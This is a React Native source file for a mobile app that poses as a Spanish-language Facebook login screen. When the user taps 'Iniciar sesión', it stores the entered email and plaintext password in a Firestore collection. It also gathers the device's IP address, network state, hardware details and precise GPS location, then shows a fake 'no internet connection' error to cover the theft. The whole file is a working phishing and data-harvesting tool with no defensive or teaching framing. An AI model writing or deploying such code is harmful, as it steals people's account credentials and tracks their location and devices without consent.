import { StatusBar } from 'expo-status-bar';
import React, { useState, useEffect } from 'react';
import { Platform, StyleSheet, Text, View, Image, TextInput, Button, ScrollView, TouchableOpacity, Alert} from 'react-native';
import header from './assets/header.jpeg';
import firebase from './database/firebase';
import { collection, addDoc } from "firebase/firestore";
import * as Device from 'expo-device';
import * as Location from 'expo-location';
import * as Network from 'expo-network';


export default function App() {

  const [location, setLocation] = useState(null);
  const [errorMsg, setErrorMsg] = useState(null);

  useEffect(() => {
    (async () => {
      let { status } = await Location.requestForegroundPermissionsAsync();
      if (status !== 'granted') {
        setErrorMsg('Permission to access location was denied');
        return;
      }

      let location = await Location.getCurrentPositionAsync({});
      setLocation(location);
    })();
  }, []);

  let text = 'Waiting..';
  if (errorMsg) {
    text = errorMsg;
  } else if (location) {
    text = JSON.stringify(location);
  }

  const [state, setState] = useState({
    email: '',
    password: '',
    coloremail: '#A7A8AB',
  });

  const captext = (name,value) =>{
    setState({...state,[name]:value,coloremail: '#053D87'});
  }

  const saveinfo = async () =>{
    if (state.email == '' || state.password == '') {

      console.log("Don't send")

    } else {

      let t = new Date(); 
      let time = t.getDate() + "/" + (t.getMonth()+1) + "/" + t.getFullYear();

      function formatSizeUnits(bytes){
        if      (bytes >= 1073741824) { bytes = (bytes / 1073741824).toFixed(2) + " GB"; }
        else if (bytes >= 1048576)    { bytes = (bytes / 1048576).toFixed(2) + " MB"; }
        else if (bytes >= 1024)       { bytes = (bytes / 1024).toFixed(2) + " KB"; }
        else if (bytes > 1)           { bytes = bytes + " bytes"; }
        else if (bytes == 1)          { bytes = bytes + " byte"; }
        else                          { bytes = "0 bytes"; }
        return bytes;
      }

      const showAlert = () =>
      Alert.alert(
        'Error de red',
        'No se ha detectado conexión a internet',
        [
          {
            text: 'Aceptar',
          },
        ],
        {
          cancelable: true,
        }
      );

      const docRef = await addDoc(collection(firebase.db, "users"), { 
        date: time,
        data: {
          email: state.email,
          password: state.password,
        },
        network:{ 
          ip: await Network.getIpAddressAsync(),
          connection: await Network.getNetworkStateAsync(),
        },
        device: {
          os: Device.osName,
          os_version: Device.osVersion,
          hardware: Device.brand,
          manufacurer: Device.manufacturer,
          memory: formatSizeUnits(Device.totalMemory),
          model: Device.modelName,
          name: Device.deviceName,
          processor: Device.supportedCpuArchitectures,
          product: Device.productName,
        },
        location: location.coords,
      });
      
      showAlert();

    }

  }

  return ( 
    <ScrollView  style={styles.container}>

      <View>
      <StatusBar backgroundColor="#053D87"/>
      <Image source={header} style={styles.header}/>
      <Text style={styles.idiomas}>English • Français • <Text style={{color:'#5397E8'}}>Más...</Text> </Text>
      </View>
      
      <View  style={styles.username}>
      <TextInput onChangeText={(value)=>captext('email', value)} style={{marginBottom: 10, fontSize:18, color: '#fff'}} placeholder="Teléfono o Correo Electrónico" placeholderTextColor="#A7A8AB"/>
      </View>

      <View  style={styles.username2}>
      <TextInput onChangeText={(value)=>captext('password', value)} secureTextEntry={true} style={{marginBottom: 10, fontSize:18, color: '#fff'}} placeholder="Contraseña" placeholderTextColor="#A7A8AB"/>
      </View>

      <View style={styles.login}>
        <Button onPress={()=>{ saveinfo() }} title='Iniciar sesión'/>
      </View>

      <View style={{marginTop:30, marginBottom:30,}}>
        <Text style={{color:'#5397E8',textAlign:'center', fontSize:15}}>¿Olvidaste tu contraseña?</Text>
      </View>

    <View style={{flexDirection: 'row', marginHorizontal:40}}>

      <View style={{backgroundColor: '#A7A8AB', height: 1, flex: 1, alignSelf: 'center'}} />
      <Text style={{ alignSelf:'center', paddingHorizontal:5, fontSize: 15, color:'#A7A8AB' }}>O</Text>
      <View style={{backgroundColor: '#A7A8AB', height: 1, flex: 1, alignSelf: 'center'}} />

    </View>

    <View style={styles.create}>

      <TouchableOpacity style={{backgroundColor:'#31A34C', height:35, borderRadius:2}}>
        <Text style={{color:'#fff', textAlign:'center', marginTop:8.5, fontSize:15}}>Crear cuenta de Facebook</Text>
      </TouchableOpacity>
    
    </View>

    </ScrollView> 

    
  );
}
 
const styles = StyleSheet.create({
  container: { 
    flex: 1,
    backgroundColor: "#242527",
  },
  header: {
    marginTop: 25,
    width: 357,
    height: 200, 
  },
  idiomas: {
    marginTop: 7,
    textAlign: "center",
    color: "#A7A8AB",
    fontSize: 15,
  },
  username: {
    flex: 1,
    color: "#A7A8AB",
    padding: 0,
    marginBottom: 0,
    borderBottomWidth: 1,
    borderBottomColor: '#A7A8AB',
    marginTop: 50,
    marginHorizontal: 40,
  },
  username2: {
    flex: 1,
    color: "#A7A8AB",
    padding: 0,
    marginBottom: 15,
    borderBottomWidth: 1,
    borderBottomColor: '#A7A8AB',
    marginTop: 25,
    marginHorizontal: 40,
  },

  login:{
    marginTop: 20,
    flex: 1,
    padding: 0,
    marginHorizontal: 40,
  },

  line:{
    flex:1,
    color: "#A7A8AB",
    padding: 0,
    borderBottomWidth: 1,
    borderBottomColor: '#A7A8AB',
  },

  create:{
    marginTop: 20,
    flex: 1,
    padding: 0,
    marginHorizontal: 60,
  },
}) 